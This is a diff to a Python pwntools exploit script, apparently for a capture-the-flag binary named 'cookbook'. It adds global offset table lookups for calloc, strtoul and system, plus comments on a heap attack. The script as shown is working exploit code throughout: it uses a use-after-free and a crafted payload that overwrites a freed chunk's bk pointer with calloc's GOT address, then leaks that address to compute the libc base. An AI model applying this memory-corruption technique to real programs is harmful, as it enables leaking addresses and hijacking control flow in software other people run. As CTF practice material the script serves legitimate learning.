@@ -62,9 +62,15 @@ heap overflow:
         continue
 '''
 
+
 r = process('./cookbook')
 
+b = ELF('./cookbook')
 libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+
+CALLOC_GOT = b.got['calloc']
+STRTOUL_GOT = b.got['strtoul']
+SYSTEM_OFFSET = libc.symbols['system']
 
 s = lambda x: r.send(x + '\n')
 
@@ -76,15 +82,15 @@ if __name__ == '__main__':
     s('babo')
 
     s('c')
-    s('n')
-    s('a')
+    s('n') # calloc(1, 0x40C)
+    s('a') # force to do 2 malloc()'s which will prevent merging with the top chunk.
     s('basil')
     s('1')
     
-    s('d')
+    s('d') # free(). the first two dword's are overwritten with ptr to main_arena.binlist.
 
     r.clean()
-    s('p')
+    s('p') # the first two dword's are treated as listheads.
     resp = r.recv()
     s('q')
 
@@ -95,20 +101,21 @@ if __name__ == '__main__':
     
     r.recvuntil("[q]uit")
 
+    #
     s('g')
     r.recvuntil(":")
-    s('40c')
+    s('40C') # calloc(1, 0x40C)
 
     # 0x804d048: calloc@got
     RECIPE = TOP_CHUNK - (0x6d8-0x2b0)
     BASIL_NODE = RECIPE + (0x6c0-0x2b0)
-    PAYLOAD = p32(BASIL_NODE) + p32(0x804d048) + "\x00" * (0x40c-4-4)
-    s(PAYLOAD)
+    PAYLOAD = p32(BASIL_NODE) + p32(CALLOC_GOT) + "\x00" * (0x40c-4-4)
+    s(PAYLOAD) # overwrite [bk]. [fd] should not change.
 
     s('c')
 
     r.clean()
-    s('p')
+    s('p') # use after free
     resp = r.recvuntil("[q]uit")
    
     print resp
@@ -119,3 +126,4 @@ if __name__ == '__main__':
 
     LIBC_BASE = LEAKED - libc.symbols['calloc']
     log.info('LIBC_BASE: 0x%x' % LIBC_BASE)
+
